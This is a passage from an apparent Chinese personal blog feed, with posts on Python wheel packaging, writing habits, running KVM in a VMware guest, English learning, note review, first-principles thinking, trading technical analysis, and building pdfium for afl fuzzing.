    <tags>
      
      <tag>PKM</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>python3 pip loading egg is deprecated 警告的解决方法</title>
    <link href="/cn/egg-is-deprecated/"/>
    <url>/cn/egg-is-deprecated/</url>
    
    <content type="html"><![CDATA[<h2 id="解决-egg-is-deprecation-警告"><a href="#解决-egg-is-deprecation-警告" class="headerlink" title="解决 egg is deprecation 警告"></a>解决 egg is deprecation 警告</h2><p>python3 -m pip install some_package 时发现 exploitable 有警告：</p><blockquote><p>DEPRECATION: Loading egg at exploitable-1.32-py3.12.egg is deprecated. pip 24.3 will enforce this behaviour change. A possible replacement is to use pip for package installation.<br>Discussion can be found at <a href="https://github.com/pypa/pip/issues/12330">https://github.com/pypa/pip/issues/12330</a></p></blockquote><p>pip 24.3 将废弃 egg 形式的 python package, 根据 github issue [1] 的信息 pip 24.3 将在 October 2024 发布。可以使用下面的方法，要去掉上面的警告信息。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs sh"><br><span class="hljs-built_in">cd</span> exploitable_src_dir<br><br><span class="hljs-comment"># 删除老的 build 结果</span><br><span class="hljs-built_in">rm</span> -rf build dist htmlcov *.egg-info<br><br><span class="hljs-comment"># 升级 pip</span><br>python3 -m pip install --upgrade build<br><br><span class="hljs-comment"># 重新 build</span><br>python3 -m build --wheel<br><br><span class="hljs-comment"># 使用 wheel 的方式安装</span><br>python3 -m pip install . --user<br><br></code></pre></td></tr></table></figure><p>一般情况下，不用重新写 pyproject.toml ，执行上面命令就可以了。</p><h2 id="在-Wheel-中添加二进制文件的方法"><a href="#在-Wheel-中添加二进制文件的方法" class="headerlink" title="在 Wheel 中添加二进制文件的方法"></a>在 Wheel 中添加二进制文件的方法</h2><p>根据python 官方的文档，MANIFEST.in 只对 source distributions (sdist) 起作用。</p><blockquote><p>MANIFEST.in does not affect binary distributions such as wheels.</p></blockquote><p>要想给 wheel 添加非纯 python 的文件，有一些困难，主要是一些使用 Extension 的 Python Package 会遇上这个问题。通过研究发现，可以控制 <code>setup.py bdist_wheel</code> 的参数达到打包so 文件的效果。</p><p>执行 <code>python3 setup.py bdist_wheel --help</code> ，可以看到详细的参数。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs sql">Options <span class="hljs-keyword">for</span> <span class="hljs-string">&#x27;bdist_wheel&#x27;</span> command:<br>  <span class="hljs-comment">--bdist-dir (-b)  temporary directory for creating the distribution</span><br>  <span class="hljs-comment">--plat-name (-p)  platform name to embed in generated filenames (default:</span><br>                    linux_x86_64)<br>  <span class="hljs-comment">--keep-temp (-k)  keep the pseudo-installation tree around after creating</span><br>                    the distribution archive<br>  <span class="hljs-comment">--dist-dir (-d)   directory to put final built distributions in</span><br>  <span class="hljs-comment">--skip-build      skip rebuilding everything (for testing/debugging)</span><br>  <span class="hljs-comment">--relative        build the archive using relative paths (default: false)</span><br>  <span class="hljs-comment">--owner (-u)      Owner name used when creating a tar file [default: current</span><br>                    <span class="hljs-keyword">user</span>]<br>  <span class="hljs-comment">--group (-g)      Group name used when creating a tar file [default: current</span><br>                    <span class="hljs-keyword">group</span>]<br>  <span class="hljs-comment">--universal       make a universal wheel (default: false)</span><br>  <span class="hljs-comment">--compression     zipfile compression (one of: stored, deflated) (default:</span><br>                    <span class="hljs-string">&#x27;deflated&#x27;</span>)<br>  <span class="hljs-comment">--python-tag      Python implementation compatibility tag (default: &#x27;py3&#x27;)</span><br>  <span class="hljs-comment">--build-number    Build number for this particular version. As specified in</span><br>                    PEP<span class="hljs-number">-0427</span>, this must <span class="hljs-keyword">start</span> <span class="hljs-keyword">with</span> a digit. [<span class="hljs-keyword">default</span>: <span class="hljs-keyword">None</span>]<br>  <span class="hljs-comment">--py-limited-api  Python tag (cp32|cp33|cpNN) for abi3 wheel tag (default:</span><br>                    <span class="hljs-literal">false</span>)<br></code></pre></td></tr></table></figure><p>利用<code>--bdist-dir</code> 参数，修改生成wheel distributions 的目录可以达到目的。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> setuptools <span class="hljs-keyword">import</span> setup, Extension, find_packages<br><br>lib_name = Extension()<br>setup(name=<span class="hljs-string">&#x27;package_name&#x27;</span>,<br>      packages=find_packages(),<br>      package_data=&#123;<span class="hljs-string">&#x27;&#x27;</span>: [<span class="hljs-string">&#x27;*.so&#x27;</span>]&#125;,<br>      include_package_data=<span class="hljs-literal">True</span>,<br>      ...,<br>      ext_modules=[lib_name],<br>      options=&#123;<br>          <span class="hljs-string">&#x27;bdist_wheel&#x27;</span>: &#123;<span class="hljs-string">&#x27;python_tag&#x27;</span>: <span class="hljs-string">&#x27;cp30&#x27;</span>, <span class="hljs-string">&#x27;py_limited_api&#x27;</span>: <span class="hljs-string">&#x27;cp32&#x27;</span>, <span class="hljs-string">&#x27;bdist_dir&#x27;</span>: <span class="hljs-string">&#x27;build&#x27;</span>&#125;,<br>          <span class="hljs-string">&#x27;build_ext&#x27;</span>: &#123;<span class="hljs-string">&#x27;build_lib&#x27;</span>: <span class="hljs-string">&#x27;build/package_name&#x27;</span>&#125;,<br>      &#125;<br>)<br></code></pre></td></tr></table></figure><p>修改 setup.py 后，重新执行 <code>python3 -m build --wheel</code> 即可。</p><h2 id="参考信息"><a href="#参考信息" class="headerlink" title="参考信息"></a>参考信息</h2><p>[1] <a href="https://github.com/pypa/pip/issues/12330">Remove support for installed .egg distributions</a><br>[2] <a href="https://packaging.python.org/en/latest/tutorials/packaging-projects/#uploading-your-project-to-pypi">Packaging Python Projects</a><br>[3] <a href="https://docs.python.org/3.11/distutils/setupscript.html">Writing the Setup Script</a><br>[4] <a href="https://packaging.python.org/en/latest/guides/distributing-packages-using-setuptools/">Packaging and distributing projects</a><br>[5] <a href="https://buildmedia.readthedocs.org/media/pdf/wheel/stable/wheel.pdf">wheel Documentation</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>Programming</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>公开写作的好处和坚持不懈</title>
    <link href="/cn/public_writing/"/>
    <url>/cn/public_writing/</url>
    
    <content type="html"><![CDATA[<h2 id="公开写作的好处"><a href="#公开写作的好处" class="headerlink" title="公开写作的好处"></a>公开写作的好处</h2><p>只有将想法写出来的时候，你才会发现似乎严密的论证中的逻辑漏洞和无知之处，不动笔的思考往往马虎。</p><ul><li>写下你学习的东西，可以加深你对该主题的理解，有时候向别人解释时你会发现自己的知识缺口。写作不仅是一个记录的方法，它是一个加深理解和暴露知识差距的强大工具。</li><li>写作使我们更加彻底地探索主题，并以更加连贯和准确的方式清晰地表达自己的想法。</li></ul><h2 id="坚持不懈（Consistency）的重要性"><a href="#坚持不懈（Consistency）的重要性" class="headerlink" title="坚持不懈（Consistency）的重要性"></a>坚持不懈（Consistency）的重要性</h2><p>虽然动机可能会点燃写作或任何其他创造性活动的兴趣火花，但真正点燃成功之火的是持续性。</p><ul><li>构建习惯：坚持不懈有利于习惯的建立。习惯一旦建立，将形成自动的行为，需要更少的努力保持行为模式，同时更加自然并享受其中的过程</li><li>逐步提高：持续练习可以带来逐步的提高，每次练习可能获得一个很小的进步，但拉长时间看，微小的进步会积累成显著的进步</li><li>保持动力：坚持不懈有助于保持动力。定期参加练习可以不断获得灵感，并形成肌肉记忆，显著减小开始练习时的阻力。</li><li>达到长期目标：成功通常是长期持续努力的结果。坚持不懈将日常行动和长期目标结合起来，创建一条通往成功之路。</li></ul><h2 id="坚持不懈的挑战"><a href="#坚持不懈的挑战" class="headerlink" title="坚持不懈的挑战"></a>坚持不懈的挑战</h2><ul><li>克服拖延症：拖延是坚持不懈最大的障碍，制定一个有规律的时间计划表，创造一个有利的环境，都有助于克服拖延这一挑战</li><li>处理倦怠：坚持不懈并不是不休息，平衡的生活是防止倦怠的关键，休息和充电与奋力向前同样重要</li><li>管理预期：并不是每一次练习都可以获得丰硕的成果，拥抱不完美，不要太过关注直接的成果，这样才能和坚持不懈的努力建立健康的关系。</li></ul><h2 id="保持坚持不懈的策略"><a href="#保持坚持不懈的策略" class="headerlink" title="保持坚持不懈的策略"></a>保持坚持不懈的策略</h2><ul><li>设定现实的目标： 将长期目标分解成较小的、可实现的阶段性目标，注重取得的进步而非过程完美</li><li>创建例程：创建固定的例程，创建保持坚持不懈的日常安排</li><li>寻求责任感：和朋友分享你的目标或者加入群组，从别人那里获得鼓励和责任感</li><li>庆祝进步：认可并庆祝取得的进步，哪怕是微小的进步，也能产生积极的正反馈，激发继续前进的动力</li></ul><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://addyosmani.com/blog/write-learn/">https://addyosmani.com/blog/write-learn/</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>KNOWLEDGE</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>VMware Workstation Windows 10 host Ubuntu 18.04 Guest 中加载 Linux 内核 kvm 模块</title>
    <link href="/cn/qemu_kvm/"/>
    <url>/cn/qemu_kvm/</url>
    
    <content type="html"><![CDATA[<p>这里在 VMware Workstation Guset OS 里使用 qemu 的用法，有点像俄罗斯套娃。</p><p>qemu.sh</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs sh">qemu-system-x86_64 \<br>  -m 2G \<br>  -smp 2 \<br>  -kernel <span class="hljs-variable">$KERNEL</span>/arch/x86——64/boot/bzImage \<br>  -append <span class="hljs-string">&quot;console=ttyS0 root=/dev/sda earlyprintk=serial net.ifnames=0&quot;</span> \<br>  -drive file=<span class="hljs-variable">$IMAGE</span>/bullseye.img,format=raw \<br>  -net user,host=10.0.2.10,hostfwd=tcp:127.0.0.1:10021-:22 \<br>  -net nic,model=e1000 \<br>  -enable-kvm \<br>  -nographic \<br>  -pidfile vm.pid \<br>  2&gt;&amp;1 | <span class="hljs-built_in">tee</span> vm.log<br></code></pre></td></tr></table></figure><p>执行命令后 <code>bash ./qemu.sh</code> 后报错</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh">Could not access KVM kernel module: No such file or directory. <br>qemu-system-x86_64: failed to initialize KVM: No such file or directory<br></code></pre></td></tr></table></figure><h2 id="解决-failed-to-initialize-KVM-错误"><a href="#解决-failed-to-initialize-KVM-错误" class="headerlink" title="解决 failed to initialize KVM 错误"></a>解决 failed to initialize KVM 错误</h2><p><code>lsmod | grep -i kvm</code> 发现没有加载 kvm 内核模块</p><p>使用 kvm-ok 检查具体情况。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sh">sudo /usr/sbin/kvm-ok<br><br>INFO: Your CPU does not support KVM extension<br>KVM acceleration can NOT be used<br></code></pre></td></tr></table></figure><p>首先检查 VMware Workstation 的设置，发现处理器没有勾选虚拟化相关的设置。</p><ul><li>关机，调整 VMware 设置，设置 -&gt; 硬件 -&gt; 处理器 -&gt; 虚拟化引擎 -&gt; 选择 虚拟化 Intel VT-x &#x2F; EPT 或 AMD-V &#x2F; RVI</li></ul><p>重新打开 Ubuntu Guest 虚拟机报错 <code>此平台不支持虚拟化的Intel VT-x/EPT</code></p><h2 id="解决此平台不支持虚拟化的Intel-VT-x-EPT"><a href="#解决此平台不支持虚拟化的Intel-VT-x-EPT" class="headerlink" title="解决此平台不支持虚拟化的Intel VT-x&#x2F;EPT"></a>解决此平台不支持虚拟化的Intel VT-x&#x2F;EPT</h2><p>首先检查 BIOS 的设置是否正确，任务右键打开任务管理器 -&gt; 性能 -&gt; CPU 右下角，虚拟化：已启用，说明 BIOS 设置没有问题。</p><p>网络上的资料说需要禁用 Hyper-V，使用命令行的方法比较方便。</p><ul><li>以管理员权限打开 CMD 执行命令 <code>bcdedit /set hypervisorlaunchtype off</code> 关闭 hypervisorlaunchtype，重启系统</li></ul><p>重新执行 <code>/usr/sbin/kvm-ok</code> 显示一切正常</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">INFO:</span> <span class="hljs-keyword">/dev/</span>kvm exists<br>KVM acceleration can be used<br></code></pre></td></tr></table></figure><p><code>egrep &quot;vmx|svm&quot; /proc/cpuinfo</code> 匹配 vmx，<code>lsmod | grep -i kvm</code> 显示加载了 <code>kvm_intel</code> 和 <code>kvm</code> 内核模块。</p><p>重新验证 Ubuntu Guest 里 qemu 是否正常工作，执行执行 qemu.sh，报错 <code>Could not access KVM kernel module: Permission denied</code></p><h2 id="解决-failed-to-initialize-KVM-Permission-denied"><a href="#解决-failed-to-initialize-KVM-Permission-denied" class="headerlink" title="解决 failed to initialize KVM: Permission denied"></a>解决 failed to initialize KVM: Permission denied</h2><p>看上去是权限问题，将当前用户添加在 kvm 组，<code>sudo usermod -a -G kvm &quot;test&quot;</code>，重启系统，执行 <code>bash ./qemu.sh</code> 成功启动</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs arcade">early <span class="hljs-built_in">console</span> in setup code<br>early <span class="hljs-built_in">console</span> in extract_kerne<br>...<br></code></pre></td></tr></table></figure><p>此文档可能有不完备之处，后续会继续更新此文档。</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.xda-developers.com/disable-hyper-v-windows-11/">https://www.xda-developers.com/disable-hyper-v-windows-11/</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>linux</tag>
      
      <tag>Security</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>comprehensible input  英语学习方法</title>
    <link href="/cn/learning_english/"/>
    <url>/cn/learning_english/</url>
    
    <content type="html"><![CDATA[<p>youtube 上有 youtuber 在不出国的情况下，将第二外语学习到母语者水平的成功案例。</p><p>Makoto 是一位会说中日英三门语言的 Youtuber，他总结自己学习第二外语的成功经验，可以简单地归纳成一句话：掌握第二外语最重要的是必须有大量地道的 comprehensible input (可理解的输入)。</p><p>Comprehensible input 是 Stephen D. Krashen 提出的语言习得假说，强调语言学习是获得的，而不是通过学习得到的。听力或者阅读获取的内容都可以是有效的输入，获取内容的语言难度必须略高于学习者的水平。</p><p>多大的地道语言输入量才是合适的 ？Makoto 推荐的时长为 1 个小时，30 分钟后休息 5 分钟，然后再继续下一个 30 分钟的学习。</p><p>Youtuber Makoto comprehensible input 英语学习具体步骤：<br>1）使用传统的学习方法，掌握 2000 个单词<br>2）在 youtube 上看视频，打开字幕边看边听，接受一些搞不懂的内容 (如果大量单词不认识就放弃)<br>3）在 youtube 上看视频，如果难度不够 (能听懂 80%以上)，就提高难度<br>4）将口语练习放到最后的步骤，只有输入够了，才能说出地道的外语</p><p>从理解内容到流利地说还有一段距离，Makoto 使用的方法是付费真人聊天，算是比较常规的方法。详细内容可以参考原视频。</p>]]></content>
    
    
    
    <tags>
      
      <tag>KNOWLEDGE</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>定期回顾笔记的好处</title>
    <link href="/cn/note_review/"/>
    <url>/cn/note_review/</url>
    
    <content type="html"><![CDATA[<p>少楠在 《笔记的方法》中介绍了一种 「通过回顾持续刺激」的笔记技术，我以前曾简称为「漫游笔记」技术。</p><p>定期回顾自己的笔记大体有下面几个好处：</p><ul><li>对抗遗忘曲线：尤其是文献笔记等自己不熟悉的笔记</li><li>推动知识内化，想法迭代：知识结构优化，新旧知识连接</li><li>遇见过去的自己 （挺好玩，挺有趣）</li><li>影响现实：促进自我审视，提供思路和线索</li></ul><p>对抗遗忘曲线：我们可能遗忘笔记的内容，尤其是文献笔记等不熟悉的内容。人的思维、行为、习惯具有惯性，观念、思维、方法并不容易改变，必须不断提醒自己。</p><p>知识内化：前提是笔记的上下文没有丢失，如果看不懂笔记了，笔记就失去了价值。所以，这里有一个关键点，笔记是写给未来的自己看的，应该假设未来的自己对文本背后的思想，原文背景一无所知，只具备相关的领域知识。</p><p>子曰：「温故而知新，可以为师矣」回顾笔记提供了再次学习的机会，不断加深对知识的理解，也能促进新的洞见的产生。</p><p>想法迭代：回顾笔记是用新视角去审视旧想法，总体来说人是会不断进步的，经过一段时间后再去重温自己某个时刻的想法，可能以前的一些疑惑现在已经没有了，也可能对某个问题有了更进一步的思路，这是促使想法迭代的一种方法。</p><p>影响现实：如果你长期关注特定的领域，以前的笔记可能给你现在做的事提供思路和线索，幸运的话，能迸发出新的灵感。</p><p>回顾笔记提供了过去和现在连接的机会。现在是否具备实践的机会？笔记中的思路、方法、知识都已经成功应用了吗？计划是否如期完成？错误是否已经纠正？坦诚地面对过去的自己，回到现实，可能你将迎来崭新的自己。</p><p>参考：<a href="https://www.usmacd.com/cn/note/">https://www.usmacd.com/cn/note/</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>PKM</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>万维钢谈第一性原理</title>
    <link href="/cn/diyixingyuanli/"/>
    <url>/cn/diyixingyuanli/</url>
    
    <content type="html"><![CDATA[<p>伊隆·马斯克解释 第一性原理，我们思考老问题，不一定需要使用类比思维考虑前人的做法，直接从最基本的原理出发，可能会找到全新的办法。创业者说第一性原理，精神的主旨为「抛开成见，拒绝套路」，回到最基本的限制条件，重新认识和解决问题。</p><p>马斯克使用第一性原理计算电池价值的例子，可能不太正确。电池的根本价值，重要的不是组成它的材料，而是材料的结合方式 - 凝结在它身上的信息。电池身上的信息，是技术和专利，这是几代人智慧的结晶。</p><p>从物理学上说，所谓第一性原理，是最基本的物理定律。数学学科的所有内容都是建立在第一性原理上的，从几条公理出发，推导出各种定律，所以数学是百分之百正确的学科。</p><p>从第一性原理出发做计算，有时候问题太复杂了，科学家不能使用第一性原理时，通常有两个解法方法：<br>1）把问题简化，做一些基本假设，忽略一些「次要」条件，这些假设构成一个模型，基于模型的计算，结果可能错误<br>2）淡化计算，借助历史经验（实验），比如化学和材料科学，大量的知识是实验积累的结果，不是谁从基本物理定律算出来</p><p>模型和经验既然不是从第一性原理出发的，就有可能是错的，就有被改进的余地，将来就有可能被取代。而取代它们的，往往是更好的……模型和经验。</p><p>马斯克的精神是对的，我们不应被前人的经验束缚，应该改革和创新。但是我们需要知道，什么情况下忽略前人的经验才是理性的行为。<br>1）有了新的工具：比如有新的工具让你对事物有了全新的理解或更深的理解<br>2）环境变了：比如今天的基础设施、原材料价格、消费者状况和以前有重大差别，老一套的方法不使用了，你就需要一个全新的商业模式</p><p>万维钢：作为一个前物理学家，我对第一性原理的第一反应是最基本的物理定律，所以谁跟我说要从第一性原理出发、重新建立一套新东西，我深表怀疑 —— 因为我尊重人类文明。</p><p>SpaceX 为什么可以使用第一性原理</p><ol><li>航天不是一个竞争充分有效的市场：航天基本是 NASA 垄断的领域，NASA 自己基本上只负责设计和科学研究，它会把火箭的制造工程转包给各个小公司</li><li>NASA 现在不怎么创新：NASA 在科学探索方面没问题，一直在进步，但它就像其他大型企业一样，得了大企业病。流程会让公司一直按照惯性行事</li></ol><p>《像火箭科学家一样思考》书中，瓦罗尔分析了 SpaceX 使用第一性原理的 6 个办法</p><ul><li>尽量不外包，80%的零部件自己生产</li><li>采购的方式更加灵活：可能到 ebay，废品厂去买二手零部件</li><li>和大市场对接：利用民用的产业链做火箭 (可能是最重要的一点)</li><li>回收，尽量重复使用火箭</li><li>用人不只用航天人才，也到大市场找人：从汽车、手机等快速迭代的领域寻找人才</li><li>“奥姆卡剃刀”，尽量简化制造流程</li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>KNOWLEDGE</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>个人对技术分析的一些理解</title>
    <link href="/cn/jishufenxi/"/>
    <url>/cn/jishufenxi/</url>
    
    <content type="html"><![CDATA[<ul><li><p>技术分析分三个层次：趋势跟随、支撑&#x2F;阻力，模式识别  (分先后顺序，靠前的重要)。</p></li><li><p>金融投资中的技术分析工具最主要的作用是区别出哪些标的不可以交易，所谓不可以交易就是从概率上讲胜算不理想。顺势交易的胜率要远远超过逆势交易，技术分析工具则可以帮我们识别出「正确的方向」。</p></li><li><p>传统技术分析多数利用模式识别或者统计学的方法来识别交易机会，这些方法没法从底层逻辑上进行剖析，只是在概率上有一定优势罢了，实战起来就是有时灵验有时不灵验了。</p></li><li><p>但技术分析并不是毫无价值，如果把市场看成是一个复杂系统，复杂系统的重要特征在不同层级涌现出分形自相似，从分形结构上分析基础就扎实了很多。</p></li><li><p>传统的波浪理论是对市场进行分形分析的一次尝试，但并没有分析出基本结构，出现了千人千浪的现象，无法精确的指导交易。</p></li><li><p>缠中说禅「李彪」大师的 「缠论」有了新的进展，笔、线段、中枢的说法令人耳目一新，可惜天妒英才，大师尚未全面阐述理论就离我们而去。</p></li><li><p>如果研究市场的时间长了，基本上都会涉及到 复杂系统，耗散结构理论，混沌理论 等方面的知识去。技术分析到后面，基本会涉及到是市场基本结构形态和动力学。</p></li><li><p>「不存在可以终结所有准则的准则」，技术分析工具是设计来解释市场现象的，但金融市场是一个复杂系统，我们难以对其行为进行建模，所以创造一个可以解释所有市场现象的模型在理论上就是行不通的。</p></li><li><p>技术分析工具只是尝试用一个模型来解释市场行为，它不具备预测市场走势的能力。因此只根据技术分析工具来进行交易是不可取的，我们需要使用更多维度的信息综合判断以提高我们的胜率。这些信息可能涉及基本面，行为经济学、经济学，政治等诸多方面的知识。</p></li><li><p>技术分析的模型在很多时候只是一种模糊的正确，只有市场的走势和模型解释一致时才代表解释可能正确。技术分析工具发出信号只代表市场行情的发展可能来到了一个关键点，这个关键点也是模糊的。</p></li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>investment</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>使用 afl-fuzz fuzz pdfium</title>
    <link href="/cn/pdfium-fuzz.public/"/>
    <url>/cn/pdfium-fuzz.public/</url>
    
    <content type="html"><![CDATA[<h2 id="下载源码"><a href="#下载源码" class="headerlink" title="下载源码"></a>下载源码</h2><p>先在 <a href="https://pdfium.googlesource.com/pdfium/">https://pdfium.googlesource.com/pdfium/</a> 下载源码.</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-built_in">mkdir</span> repo<br><span class="hljs-built_in">cd</span> repo<br>gclient config --unmanaged https://pdfium.googlesource.com/pdfium.git<br>gclient <span class="hljs-built_in">sync</span><br><span class="hljs-built_in">cd</span> pdfium<br></code></pre></td></tr></table></figure><p>gclient 命令在 depot_tools 中, 需要安装 参考下面的文章</p><p><a href="http://www.chromium.org/developers/how-tos/install-depot-tools">http://www.chromium.org/developers/how-tos/install-depot-tools</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">git <span class="hljs-built_in">clone</span> https://chromium.googlesource.com/chromium/tools/depot_tools.git<br><span class="hljs-built_in">export</span> PATH=`<span class="hljs-built_in">pwd</span>`/depot_tools:<span class="hljs-string">&quot;<span class="hljs-variable">$PATH</span>&quot;</span><br></code></pre></td></tr></table></figure><p>主要gclient sync 同步时需要翻墙，可以简单的使用环境变量的方法。</p><p><code>https_proxy=http://localhost:8118 gclient sync</code> 下载 download google storage过<br>程中还会遇到一个网络问题，需要编写配置文件 ~&#x2F;.boto</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-section">[Boto]</span><br><span class="hljs-attr">proxy</span> = <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>  <span class="hljs-comment"># 不带 http://</span><br><span class="hljs-attr">proxy_port</span>= <span class="hljs-number">8118</span><br></code></pre></td></tr></table></figure><p><code>export NO_AUTH_BOTO_CONFIG=~/.boto</code></p><p>源码包非常大，大概有1G多，需要耐心等待。</p><h2 id="编译"><a href="#编译" class="headerlink" title="编译"></a>编译</h2><p>编译需要使用 ubuntu 或者 Debian 系统，其他系统的依赖问题解决起来比较麻烦，<br>如果是上面两种操作系统的话，有脚本自动安装依赖。</p><p><code>./build/install-build-deps.sh</code></p><p>安装完所以依赖后就可以开始编译了，首先要先生成 gn 文件 (2016 年google 放弃使用原来的 gyp 编译方式)</p><p><code>gn args out/afl</code> 会调用vim 编译器， 输入下面的内容</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs ini"><br><span class="hljs-comment"># Build arguments go here.</span><br><span class="hljs-comment"># See &quot;gn args &lt;out_dir&gt; --list&quot; for available build arguments.</span><br><span class="hljs-attr">use_goma</span> = <span class="hljs-literal">false</span> <span class="hljs-comment"># Googlers only. Make sure goma is installed and running first.</span><br><span class="hljs-attr">is_debug</span> = <span class="hljs-literal">false</span>  <span class="hljs-comment"># Enable debugging features.</span><br><br><span class="hljs-attr">pdf_use_skia</span> = <span class="hljs-literal">true</span> <span class="hljs-comment"># Set true to enable experimental skia backend.</span><br><span class="hljs-attr">pdf_use_skia_paths</span> = <span class="hljs-literal">false</span>  <span class="hljs-comment"># Set true to enable experimental skia backend (paths only).</span><br><br><span class="hljs-attr">pdf_enable_xfa</span> = <span class="hljs-literal">true</span>  <span class="hljs-comment"># Set false to remove XFA support (implies JS support).</span><br><span class="hljs-attr">pdf_enable_v8</span> = <span class="hljs-literal">true</span>  <span class="hljs-comment"># Set false to remove Javascript support.</span><br><span class="hljs-attr">pdf_is_standalone</span> = <span class="hljs-literal">true</span>  <span class="hljs-comment"># Set for a non-embedded build.</span><br><span class="hljs-attr">is_component_build</span> = <span class="hljs-literal">false</span> <span class="hljs-comment"># Disable component build (must be false)</span><br><span class="hljs-attr">v8_static_library</span> = <span class="hljs-literal">true</span><br><br><span class="hljs-attr">clang_use_chrome_plugins</span> = <span class="hljs-literal">false</span>  <span class="hljs-comment"># Currently must be false.</span><br><span class="hljs-attr">use_sysroot</span> = <span class="hljs-literal">false</span>  <span class="hljs-comment"># Currently must be false on Linux, but entirely omitted on windows.</span><br><br><span class="hljs-attr">use_afl</span> = <span class="hljs-literal">true</span><br><span class="hljs-comment">#is_asan = true</span><br><span class="hljs-attr">enable_nacl</span> = <span class="hljs-literal">true</span><br><span class="hljs-attr">optimize_for_fuzzing</span> = <span class="hljs-literal">true</span><br><span class="hljs-attr">symbol_level</span>=<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>使用 ASAN 编译会报错，暂时不开启，接下来要解决 afl 的问题了， pdfium 的 third_party<br>中不包含 afl-fuzz 的源代码，需要到 chromium.googlesource.com 项目下载。<br>chromium 项目支持 libfuzzer 和 afl-fuzz，只要使用开关， <code>use_libfuzzer = true</code><br>或者 <code>use_afl = true</code> 即可打开。</p><p>要编译生成 pdfium_test, 必须指定 pdf_is_standalone &#x3D; true, pdfium 源码仓库中没有<br>afl-fuzz 的代码，需要自己下载。</p><p><a href="https://chromium.googlesource.com/chromium/src/third_party/+/master/afl/">https://chromium.googlesource.com/chromium/src/third_party/+/master/afl/</a></p><p>可以直接下载 .tgz 文件<br><a href="https://chromium.googlesource.com/chromium/src/third_party/+archive/master/afl.tar.gz">https://chromium.googlesource.com/chromium/src/third_party/+archive/master/afl.tar.gz</a></p><p>下载后将源码 copy 到 ~&#x2F;repo&#x2F;pdfium&#x2F;third_party&#x2F;afl 中, 使用 <code>ninja -C out/afl</code> 编译整个项目。</p><p>使用 <code>is_debug=false</code> 可以明显提高fuzzing 